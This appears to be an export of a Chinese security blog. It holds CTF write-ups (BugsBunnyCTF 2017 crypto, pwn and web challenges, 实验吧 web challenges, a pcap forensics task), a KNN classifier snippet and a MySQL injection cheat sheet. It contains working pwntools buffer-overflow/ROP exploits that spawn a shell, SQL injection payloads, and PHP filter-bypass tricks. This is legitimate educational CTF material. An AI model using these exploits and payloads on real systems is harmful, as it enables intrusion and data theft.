      <content type="text"><![CDATA[单刷好幸苦。 Crypto-15123Some classics crypto task ! Cesar maybe !!Author : Sold1ercrypto-15.txt 进行一次rot13后得到原文：123456789101112131415161718def encode(story, shift): return ''.join([ (lambda c, is_upper: c.upper() if is_upper else c) ( ("abcdefghijklmnopqrstuvwxyz"*2)[ord(char.lower()) - ord('a') + shift % 26], char.isupper() ) if char.isalpha() else char for char in story ])def decode(story,key): passif __name__ == '__main__': key = [_YOUR_KEY_HERE_] print decode("Piug_Pibbm&#123;Q35oF_3BQ0R3_4F3_B0H_G3QiF3_OH_4ZZ&#125;",key) 对Piug_Pibbm{Q35oF_3BQ0R3_4F3_B0H_G3QiF3_OH_4ZZ}进行凯撒解码。得到flag：1Bugs_Bunny&#123;C35aR_3NC0D3_4R3_N0T_S3CuR3_AT_4LL&#125; Crypto-201++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;----. &gt;+++++++++++++++++. --------------. ++++++++++++. --------------------. &lt;. &gt;++++++++++++++++++++++. -------. . +++++++++++. ++. &lt;. &gt;---------. &lt;--------------. ---. +++++++++++++++++++++++++++++. +++++++++++++++++. -------------------------. &gt;+++. &lt;&lt;++++++++++++. . &gt;&gt;++++++++. brainfuck解码，得到flag：1Bugs_Bunny&#123;Br41N_Fu**&#125; Crypto-25题目文件下载下来后打开发现是ook编码，放到下面网站中解码：1http://tool.ph0en1x.com/brainfuck/ 得到flag：1Bugs_Bunny&#123;Ju5T_OoK!&#125; Scy way123456Decrypt My Secret And Win!IHUDERMRCPESOLLANOEIHRBugs_Bunny&#123;flag&#125;Author: TnMch 栅栏密码。12IHUDERMRCPESOLLANOEIHR 得到flag：1Bugs_Bunny&#123;ISHOULDLEARNMORECIPHER&#125; Crypto-50就一直base64的解密。得到flag：1Bugs_Bunny&#123;N0T_H4Rd_4T_4ll&#125; babyRsa12N: 20473673450356553867543177537e: 17 在factordb上把N进行分解如下，得到p和q：12p = 2165121523231q = 9456131321351327 用以下脚本解出flag：1234567891011121314151617181920212223242526272829n = 20473673450356553867543177537p = 2165121523231q = 9456131321351327e = 17def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mdef decrypt(c, d, n): return pow(c, d, n)d = modinv(e, (p-1)*(q-1))print dencfile = open('enc.txt','rb')decfile = open('flag.txt','wb')for i in range(48): enc = encfile.readline()[:-1] print enc decfile.write(str(chr(decrypt(long(enc),d,n))))encfile.close()decfile.close() 运行到最后时会说overflow出错，不过不影响flag。最后的flag如下：1Bugs_Bunny&#123;Baby_RSA_Its_Cool_Lik3_school_haHAha&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugsBunnyCTF2017-pwn-writeup]]></title>
      <url>%2F2017%2F07%2F30%2FBugsBunnyCTF2017-pwn-writeup%2F</url>
      <content type="text"><![CDATA[单刷好幸苦。 Pwn5012345You look new hereso this is my gift for youtask : nc 54.153.19.139 5251just write something when connect , its always UPAuthor: TnMch 用了gets，有明显的溢出。题目中有提供了system函数执行。exp如下：123456789101112from pwn import *r = remote("54.153.19.139","5251")v6 = 0x62v7 = 0x75v8 = 0x67v9 = 0xDEFACEDoffset = 0x28 - 0x10payload = 'bug' + 'a' * (offset -3)+ p64(v9)r.sendline(payload)r.interactive() 既然可以溢出，也可以用rop来做。exp如下：1234567891011121314from pwn import *r = remote("54.153.19.139","5251")elf = ELF("pwn50")system_addr = elf.symbols['system']binsh_addr = 0x0000000000400773pop_rdi_ret_addr = 0x0000000000400743offset = 56payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)r.sendline(payload)r.interactive() 然后我进去后找了好久的flag。以为那个pwn50是文件，结果最后发现是它是个文件夹mdzz。以后找flag可以用命令来帮忙：1234$ find / -name flagfind: &apos;/root&apos;: Permission denied/home/pwn50/flag... 最后的flag：1Bugs_Bunny&#123;lool_cool_stuf_even_its_old!!!!!&#125; Pwn100123Try this , maybe little hardtask : nc 54.153.19.139 5252Author: TnMch pwn150用IDA调试后可以看到用fgets读入了192个字节，但起始位置距离rbp只有50个字节，存在溢出，而且程序没有开canary保护。溢出的offset推测为 0x50+8 = 88。 用gdb调试确定为88的偏移。由于程序中会fork出新进程，为调试方便可以在gdb调试开始时先输入set follow-fork-mode parent，然后在对应的地方下断点进行调试。 123456789101112131415161718from pwn import *elf = ELF('pwn150')r = remote("54.153.19.139","5253")print r.recvuntil("UTC 2017")print r.recvuntil("Send me your message here:")system_addr = elf.symbols['system']sh_addr = elf.search('sh').next()pop_rdi_ret_addr = 0x0000000000400883pop_rsi_pop_r15_ret = 0x0000000000400881offset = 88payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_addr)r.send(payload)r.interactive() 最后的flag：12345678$ lspwn150$ cd pwn150$ lsflagpwn150$ cat flagBugs_Bunny&#123;did_i_help_you_Solve_it!oHH_talk_to_hacker:D&#125; pwn300]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugsBunnyCTF2017-web-writeup]]></title>
      <url>%2F2017%2F07%2F30%2FBugsBunnyCTF2017-web-writeup%2F</url>
      <content type="text"><![CDATA[单刷好幸苦。 Nothing here12Nothing here !http://52.53.151.123/web/web5.php 访问后查看源代码，注释中有：1QnVnc19CdW5ueXs1MjljNDI5YWJkZTIxNzFkMGEyNTU4NDQ3MmFmODIxN30K base64解码，得到flag：1Bugs_Bunny&#123;529c429abde2171d0a25584472af8217&#125; Encryption12You know your jobhttp://52.53.151.123/web/web30.php 访问后题目说Only users of “Bugs_Bunny Browser” may access this page.。所以抓包改User-Agent。 1flag=zn8XhqnlBRBetevoFcSQAw0OMVH6Kwj23svbneF1%2B5gDfBdn9osZBfB06cTub4ARg3OTTjsBIG7x; 中间有个%2B，是+号。在https://hashkiller.co.uk/text-encryption.aspx 上，用密码Hashkiller解密。得到flag：1Bugs_Bunny&#123;hashkiller_has_a_custom_encryption_ algorithm&#125; Old php vuln !1234Hey ,AgentYour mission is to hack this secure portal .Good luck.http://52.53.151.123/web/web35.php SimplePHP12345PHP for noobs :p ?Maybe not this time :Dhttp://34.253.165.46/SimplePhp/index.phpsource : http://34.253.165.46/SimplePhp/index.txt 题目提供了源码：1234567891011121314151617181920212223242526272829&lt;?phpinclude "flag.php";$_403 = "Access Denied";$_200 = "Welcome Admin";if ($_SERVER["REQUEST_METHOD"] != "POST") die("BugsBunnyCTF is here :p...");if ( !isset($_POST["flag"]) ) die($_403);foreach ($_GET as $key =&gt; $value) $$key = $$value;foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST["flag"] !== $flag ) die($_403);echo "This is your flag : ". $flag . "\n";die($_200);?&gt; 有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中有把$flag直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个die($_200)，结合第一个foreach的功能，我们可以在第二个foreach之前先将$_200的值覆盖为原flag的值。payload如下：1234http://34.253.165.46/SimplePhp/index.php?_200=flagPOST:flag=1 得到flag：1Bugs_Bunny&#123;Simple_PHP_1s_re4lly_fun_!!!&#125; 利用前面的die($_403)也可以实现。我们先把原flag的值覆盖到$_403上，然后构造$_POST[&quot;flag&quot;] !== $flag，从而die($_403)输出flag。payload如下：1234http://34.253.165.46/SimplePhp/index.php?_403=flag&amp;_POST=1POST:flag= 同样能获得flag。 Web100前端加密问题。部分代码如下：123456var h = prompt("Please enter your passowrd");if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13])==_&amp;&amp;generate(h[15]+h[10]+h[3]+h[5]+h[6])==__&amp;&amp;generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\'m sorry my son it\' not easy');&#125; 经过初步调试后几个重要的值如下：12345_ = 6b07fd4ea837c39e1542e1bbca01a224__ = 20ee80e63596799a1543bc9fd88d8878___ = 21232f297a57a5a743894a0e4a801fc3 而generate在逆向后发现是md5加密。在google上查到对应的md5解密对应如下：123md5(tunisia) = 6b07fd4ea837c39e1542e1bbca01a224md5(bunny) = 20ee80e63596799a1543bc9fd88d8878md5(admin) = 21232f297a57a5a743894a0e4a801fc3 所以有如下对应关系：12345678h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13] t u n i s i ah[15]+h[10]+h[3]+h[5]+h[6] b u n n yh[16]+h[12]+h[14]+h[2]+h[7] a d m i n 得到的h为：1inininynusutdamba 最后的flag为：1Bugs_Bunny&#123;inininynusutdamba&#125; LQI_X1http://34.253.165.46/LQI_X 给了个登陆框，应有存在注入。 Walk walk1http://www.chouaibhm.me 发现是asw s3服务，存在未授权/信息泄露漏洞，可见Awesome CTF Book:AWS 漏洞系列。访问:1http://www.chouaibhm.me.s3.amazonaws.com/ Calculator随便进行了一些功能测试，比如点1+2，则抓包会发现有data字段时我们输入的表达式，forward掉后返回结果。驶入的表达式只允许输入数字，中小括号，感叹号，乘号，减号。猜测后端用eval执行。一开始我以为xss，将payload进行一次jsfuck加密后能绕过过滤，不过没啥用等。然后有一次的payload过长，返回的报错信息：1234567891011Error: spawn E2BIG at exports._errnoException (util.js:1018:11) at ChildProcess.spawn (internal/child_process.js:319:11) at exports.spawn (child_process.js:378:9) at Object.exports.execFile (child_process.js:143:15) at exports.exec (child_process.js:103:18) at /app/apps.js:47:11 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) 所以后端是用node.js。推测是要渗透nodojs。参考Reverse shell on a Node.js application和Pentesting Node.js Application : Nodejs Application Security 进行渗透，不过可惜没有成功。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[zctf2017-EasyReverse-writeup]]></title>
      <url>%2F2017%2F07%2F29%2Fzctf2017-EasyReverse-writeup%2F</url>
      <content type="text"><![CDATA[未完待续题目给了一个dll文件。用IDA打开，shift+F12查看字符串。 比如说有个yes字符串，双击进去。 后面的DATA XREF: get_string+74o指明了引用该字符串的地址。双击跳转到代码段(.text)。利用f5汇编功能]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[机器学习算法：最近邻(KNN)]]></title>
      <url>%2F2017%2F07%2F25%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN%2F</url>
      <content type="text"><![CDATA[机器学习算法：最近邻(KNN) 原理算法tensorflowsklearn123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import numpy as npimport pandas as pdfrom sklearn.datasets import load_breast_cancerfrom sklearn.model_selection import train_test_splitfrom sklearn.neighbors import KNeighborsClassifiercancer = load_breast_cancer()print(cancer.DESCR)def convertToDataframe():feature = cancer['feature_names']df = pd.DataFrame(cancer.data,index=range(569),columns=feature)df['target'] = cancer.targetreturn dfprint("Now convert the dataset into dataframe:\n")cancerdf = convertToDataframe()print(cancerdf.head())def classDistribution(cancerdf):malignant = len(cancerdf[cancerdf['target']==0])benign = len(cancerdf[cancerdf['target']==1])index = ['malignant', 'benign']target = pd.Series([malignant,benign],index=index)return targetdef splitDataset(cancerdf):X = cancerdf[cancerdf.columns[:30]]y = cancerdf[cancerdf.columns[30]]X_train,X_test, y_train, y_test = train_test_split(X,y,random_state = 0)return X_train, X_test, y_train, y_testdef trainKNN(feature_data,class_data,k):knn = KNeighborsClassifier(n_neighbors=k)knn.fit(feature_data,class_data)return knnprint("\nThe class distribution is:\n")print(classDistribution(cancerdf))print("\nUsing train_test_split, split X and y into training and test sets (X_train, X_test, y_train, and y_test).using random_state=0\n")X_train, X_test, y_train, y_test = splitDataset(cancerdf)print("X_train: " ,X_train.shape)print("X_test: " ,X_test.shape)print("y_train: " ,y_train.shape)print("y_test: ", y_test.shape)print("Now, training the Knn model: done!\n")knn = trainKNN(X_train,y_train,1)print("Predict the class label using the mean value for each feature.\n")print("The mean value for each feature.\n")means = cancerdf.mean()print(means)means = means[:-1].values.reshape(1, -1)means_predict = knn.predict(means)print("The predict result : ",means_predict)print("Predict the class labels for the test set X_test")test_predict = knn.predict(X_test)print("The prediction result ：\n",test_predict)print("The prediction result accuracy : ",knn.score(X_test,y_test))]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[实验吧-web-writeup]]></title>
      <url>%2F2017%2F07%2F24%2F%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup%2F</url>
      <content type="text"><![CDATA[实验吧-web-writeup（持续更新） 登陆一下好吗payload:1username=&apos;=&apos; &amp;password=&apos; = &apos; 后端查询语句注入为:1select XXX from XXX where user = &apos; &apos;=&apos; &apos; AND pass = &apos; &apos;=&apos; &apos; 得到flag：1ctf&#123;51d1bf8fb65a8c2406513ee8f52283e7&#125; who are you?考点：基于时间的盲注，insert注入ip伪装技巧：12345X-Forwarded-ForClient-IPx-remote-IPx-originating-IPx-remote-addr 因缺思汀的绕过查看源代码。注释中有：1source: source.txt 访问得到源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST['uname']) || !isset($_POST['pwd'])) &#123; echo '&lt;form action="" method="post"&gt;'."&lt;br/&gt;"; echo '&lt;input name="uname" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input name="pwd" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input type="submit" /&gt;'."&lt;br/&gt;"; echo '&lt;/form&gt;'."&lt;br/&gt;"; echo '&lt;!--source: source.txt--&gt;'."&lt;br/&gt;"; die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match("/".$ArrReq."/is",$StrValue)==1)&#123; print "水可载舟，亦可赛艇！"; exit(); &#125;&#125;$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");if (!$con)&#123; die('Could not connect: ' . mysql_error());&#125;$db="XXXXXX";mysql_select_db($db, $con);$sql="SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'";$query = mysql_query($sql);if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print "CTF&#123;XXXXXX&#125;"; &#125;else&#123; print "亦可赛艇！"; &#125;&#125;else&#123; print "一颗赛艇！";&#125;mysql_close($con);?&gt; 用到mysql中的with rollup技巧。用普通的select查询下；1234567mysql&gt; SELECT uname,pass FROM test.table;+---------+------+| uname | pass |+---------+------+| chybeta | 123 |+---------+------+1 row in set (0.00 sec) 在加上group by pass with rollup后12345678mysql&gt; SELECT uname,pass FROM test.table group by pass with rollup;+---------+------+| uname | pass |+---------+------+| chybeta | 123 || chybeta | NULL |+---------+------+2 rows in set (0.01 sec) rollup在查询结果中加上了一行，并且pass字段的值为NULL。这样当我们post进的pwd的值为空，就能满足$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]的条件了。 在此之前我们还有一个条件要满足mysql_num_rows($query) == 1，我们要选择pass为NULL的单独的这一条记录。从源码分析可得，过滤了逗号，我们不能简单的使用limit 1,1这样的语法，而是可以使用limit 1 offset 1。就本地环境而言，比如 1234567mysql&gt; SELECT uname,pass FROM test.table group by pass with rollup limit 1 offset 1;+---------+------+| uname | pass |+---------+------+| chybeta | NULL |+---------+------+1 row in set (0.01 sec) 最后构造出的payload如下：1uname=&apos; or 1=1 group by pwd with rollup limit 1 offset 2 #&amp;pwd= 之所以为offset为2，是因为rollup是在查询结果最后加上一行，而我们通过or 1=1查询出来的不知道有多少行，所以这个2是fuzz出来的。 最后flag：1CTF&#123;with_rollup_interesting&#125; 简单的sql注入1http://ctf5.shiyanbar.com/423/web/ Once More1234567891011121314151617181920212223&lt;?phpif (isset ($_GET[&apos;password&apos;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) &#123; echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;; &#125; else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999) &#123; if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE) &#123; die(&apos;Flag: &apos; . $flag); &#125; else &#123; echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;); &#125; &#125; else &#123; echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;; &#125;&#125;?&gt; 第一层判断通过ereg，要求只能出现字母和数字，但ereg有缺陷，可以用%00绕过。第二层判断要求位数少但要大于9999999，可以利用科学计数法。最里层要求出现*-*，用%00后面再加上即可。payload:12http://ctf5.shiyanbar.com/web/more.php?password=9e9%00*-* flag：1CTF&#123;Ch3ck_anD_Ch3ck&#125; Guess Next Session1http://ctf5.shiyanbar.com/web/Session.php 给了源代码123456789101112&lt;?phpsession_start();if (isset ($_GET[&apos;password&apos;])) &#123; if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;]) die (&apos;Flag: &apos;.$flag); else print &apos;&lt;p&gt;Wrong guess.&lt;/p&gt;&apos;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; 预测是个幌子。session_start() 基于PHPSESSID=oso27id67fqu8hbvq57bacahn3作为身份认证信息，所以我们随便在PHPSESSID中加几个字母，这时服务器端的$_SESSION[&#39;password&#39;]为空，然后我们的password再置为空， 然后就得到了flag： FALSE1http://ctf5.shiyanbar.com/web/false.php 给了源码：123456789101112&lt;?phpif (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';&#125;else&#123; echo '&lt;p&gt;Login first!&lt;/p&gt;';?&gt; 输入的name和password不能一样，之后的sha1比较用了===，不存在弱类型问题。但sha1不能处理数组，当我们传入name[]=1&amp;password[]=2时，会造成sha1(Array) === sha1(Array)，即NULL===NULL，从而吐出flag。本地测试如下：1234&lt;?php$name = $_GET[&apos;name&apos;];var_dump(@sha1($name));?&gt; payload：1http://ctf5.shiyanbar.com/web/false.php?name[]=1&amp;password[]=2 上传绕过上传路径截断。 burp抓包，修改为 uploads/cap.php .jpg 转到hex编码，将空格20，改为00 发包。 1flag&#123;SimCTF_huachuan&#125; 程序逻辑问题1http://ctf5.shiyanbar.com/web/5/index.php 访问后查看源代码，有个index.txt。得到源码：1234567891011121314151617181920212223242526272829&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;); mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error) &#123; die(&quot;Connection failed: &quot; . mysql_error($conn));&#125;$user = $_POST[user];$pass = md5($_POST[pass]);$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;$query = mysql_query($sql);if (!$query) &#123; printf(&quot;Error: %s\n&quot;, mysql_error($conn)); exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;&#125;else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; 对$user没有过滤，尝试报错注入：1user=&apos;and extractvalue(1, concat(0x5c, (select pw from phpformysql.php limit 1)))#&amp;pass=1 结果很尴尬：1welcome to simplexue Error: SELECT command denied to user &apos;web6lo&apos;@&apos;localhost&apos; for table &apos;php&apos; 好吧题目既然说是逻辑漏洞，接下来那就找咯。可以看到它的用户名和密码是分开判断的。并且用户名处存在注入。所以思路如下，我们给用户名传入：1user=&apos; union select &quot;0e830400451993494058024219903391&quot; 构成的sql语句为：1select pw from php where user=&apos; &apos; union select &quot;0e830400451993494058024219903391&quot; 第一个查询结果为空，所以结果返回的是我们传入的0e830400451993494058024219903391，即此时，$row[pw]=0e830400451993494058024219903391。而md5(QNKCDZO)正是该0e字符串值。 最后的payload:1user=&apos; union select &quot;0e830400451993494058024219903391&quot;#&amp;pass=QNKCDZO 得到flag：1SimCTF&#123;youhaocongming&#125; what a fuck!这是什么鬼东西?jsfuck。f12里控制台运行一下，得到flag：1Ihatejs php大法好访问1http://ctf5.shiyanbar.com/DUTCTF/index.php 得到提示：1Can you authenticate to this website? index.php.txt 访问，得到源码：1234567891011121314151617&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123; echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;flag: *****************&#125; &lt;/p&gt;";&#125;?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? 二次解码。payload：12345payload 1:http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61payload 2:http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a flag:1DUTCTF&#123;PHP_is_the_best_program_language&#125; 这个看起来有点难经过fuzz，可以知道是整数型注入。1http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,database() 得到表名。1http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() 得到列名1http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x746869736b6579 得到flag：1http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(k0y+SEPARATOR+0x3c62723e) FROM thiskey flag:1whatiMyD91dump 貌似有点难1http://ctf5.shiyanbar.com/phpaudit/ 题目提供了源码:123456789101112131415161718192021&lt;?phpfunction GetIP()&#123;if(!empty($_SERVER["HTTP_CLIENT_IP"])) $cip = $_SERVER["HTTP_CLIENT_IP"];else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];else if(!empty($_SERVER["REMOTE_ADDR"])) $cip = $_SERVER["REMOTE_ADDR"];else $cip = "0.0.0.0";return $cip;&#125;$GetIPs = GetIP();if ($GetIPs=="1.1.1.1")&#123;echo "Great! Key is *********";&#125;else&#123;echo "错误！你的IP不在访问列表之内！";&#125;?&gt; 抓包，添加X-Forwarded-For: 1.1.1.1 得到flag：1SimCTF&#123;daima_shengji&#125; 猫捉老鼠 1#WWWnsf0cus_NET# forbiden题目说:Make sure you are in HongKong抓包，修改：1Accept-Language: zh-hk 得到flag：1123JustUserAGent]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[0ctf-2015-Peers-writeup]]></title>
      <url>%2F2017%2F07%2F23%2F0ctf-2015-Peers-writeup%2F</url>
      <content type="text"><![CDATA[0ctf-2015-Peers-writeup 题目题目提供了一个流量包peers.pcapng，peers.pcapng:链接：http://pan.baidu.com/s/1nuGXACL 密码：zwl3 分析用wireshark的追踪tcp流查看。 可以看到这是关于BitTorrent协议的包。wireshark中有针对BitTorrent protocol的协议解析器。但该解析器默认是工作在端口6881上，这也是BitTorrent protocol工作的常用端口。而在题目提供的流量包中，这些流量是通过80端口的，所以我们需要对流量包进行“修正”。 改端口我们可以利用tcprewrite这个工具来修改流量包。为把端口80修改为端口6881，使用下述命令：1tcprewrite --portmap=80:6881 --infile=peers.pcapng --outfile=peers_output.pcap 提取接下去就是把这些BitTorrent的内容提取出来，：）可以手动提取。比如在过滤器处先填入bittorrent.piece.index &gt;= 0，之后将三十九个数据包按照index的顺序将bittorrent.piece.data的十六进制复制到hex编辑器中。 也可以利用工具tshark。使用下面命令：1tshark -r peers_output.pcap -Y &apos;bittorrent.piece.data&apos; -Tfields -e bittorrent.piece.index -e bittorrent.piece.data &gt; pieces -r选项表示读入一个文件，-Y是用于选择过滤器，-Tfilelds用来设置输出格式。-e选项表示要列出的内容，因为我们最后要根据index来对data进行排序重组，所以有两个-e。最后我们将文件流保存到文件pieces中。 文件pieces内容如下，第一列是index，第二个是对应的data：12340x00000000 42:4d:36:c4:09:00:00.....0x00000020 69:ff:ae:84:78:ff:a6.....0x00000017 5b:ff:96:66:5a:ff:9a.....省略 重组接下去，就是根据index的顺序重组文件，用下面的脚本：123456789101112temp = &#123;&#125;peer = open("pieces","rb")result = open("result","w+")for line in peer: index = int(line[0:10],16) data = line[11:-1].replace(":","").decode("hex") temp[index] = datapeer.close()for index in sorted(temp): result.write(temp[index])result.close() 123root@chybeta:~/Desktop# python peer.pyroot@chybeta:~/Desktop# file resultresult: PC bitmap, Windows 3.x format, 800 x 200 x 32]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[MySql注入备忘录]]></title>
      <url>%2F2017%2F07%2F21%2FMySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95%2F</url>
      <content type="text"><![CDATA[简介所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 基本查看当前数据库版本 VERSION() @@VERSION @@GLOBAL.VERSION 当前登录用户 USER() CURRENT_USER() SYSTEM_USER() SESSION_USER() 当前使用的数据库 DATABASE() SCHEMA() 路径相关 @@BASEDIR : mysql安装路径： @@SLAVE_LOAD_TMPDIR : 临时文件夹路径： @@DATADIR : 数据存储路径： @@CHARACTER_SETS_DIR : 字符集设置文件路径 @@LOG_ERROR : 错误日志文件路径： @@PID_FILE : pid-file文件路径 @@BASEDIR : mysql安装路径： @@SLAVE_LOAD_TMPDIR : 临时文件夹路径： 联合数据 CONCAT() GROUP_CONCAT() CONCAT_WS() 字母/数字相关 ASCII(): 获取字母的ascii码值 BIN(): 返回值的二进制串表示 CONV(): 进制转换 FLOOR() ROUND() LOWER()：转成小写字母 UPPER(): 转成大写字母 HEX():十六进制编码 UNHEX()：十六进制解码 字符串截取 MID() LEFT() SUBSTR() SUBSTRING() 注释行间注释 — - (—后面有个空格) DROP sampletable;— # DROP sampletable;# ` (反引号) 行内注释 /* */ +DROP/* 内容 */sampletable; /*! 语句 */ /*! select * from test */ 语句会被执行 注入技术判断是否存在注入假设有: www.test.com/chybeta.php?id=1 数值型注入12345chybeta.php?id=1+1chybeta.php?id=-1 or 1=1chybeta.php?id=-1 or 10-2=8chybeta.php?id=1 and 1=2chybeta.php?id=1 and 1=1 字符型注入参数被引号包围，我们需要闭合引号。1234chybeta.php?id=1&apos;chybeta.php?id=1&quot;chybeta.php?id=1&apos; and &apos;1&apos;=&apos;1chybeta.php?id=1&quot; and &quot;1&quot;=&quot;1 联合查询查询列数用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。 UNION SELECT123UNION SELECT 1,2,3 #UNION ALL SELECT 1,2,3 #UNION ALL SELECT null,null,null # ORDER BY利用二分法1234ORDER BY 10 #ORDER BY 5 #ORDER BY 2 #.... 查询数据库1UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA # 查询表名1UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() # 假设获取到数据库名为”databasename”后，对其进行十六进制编码得到0x64617461626173656e616d65。1UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64617461626173656e616d65 # 查询列名由前一步获取到表名为tablename后，对其进行十六进制编码得到1UNION SELECT GROUP_CONCAT(column_name SEPARATOR+0x3c62723e) FROM+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7461626c656e616d65 # 获取数据1UNION SELECT GROUP_CONCAT(column_1,column_2 SEPARATOR+0x3c62723e) FROM databasename.tablename # insert/update/delete注入参考：SQL Injection in Insert Update and Delete Statements假设后台语句为：1insert into user(id,name,pass) values (1,&quot;chybeta&quot;,&quot;123456&quot;); order by后注入此部分整理自瞌睡龙:MySql注入科普 oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。 检测方法一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入： 原始链接：http://www.test.com/list.php?order=vote 根据vote字段排序。 找到投票数最大的票数num然后构造以下链接，看排序是否变化。：1list.php?order=abs(vote-(length(user())&gt;0)*num)+asc 还有一种方法不需要知道任何字段信息，使用rand函数：12list.php?order=rand(true)list.php?order=rand(false) 以上两个会返回不同的排序。 payload判断表名中第一个字符是否小于128的语句如下：1http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from 